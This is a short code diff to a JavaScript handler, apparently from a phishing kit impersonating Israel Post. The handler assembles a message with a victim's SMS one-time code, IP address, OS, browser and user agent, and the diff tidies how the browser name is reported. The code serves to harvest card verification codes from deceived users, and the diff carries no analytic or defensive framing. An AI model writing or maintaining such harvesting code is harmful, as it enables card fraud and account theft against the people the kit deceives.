@@ -51,7 +51,7 @@ module.exports.addCardOTP = async (req, res, next) => {
     [ SMS CODE:  ${otp}
     [ IP :    ${req.IP}
     [ OS :    ${osName}
-    [ Browser :    ${browser}
+    [ Browser :    ${browser.name}
     [ UA :    ${ua}
     [=====>  ISRAELPOST: GHOST $ MSD  SMS   <=====]
     `;
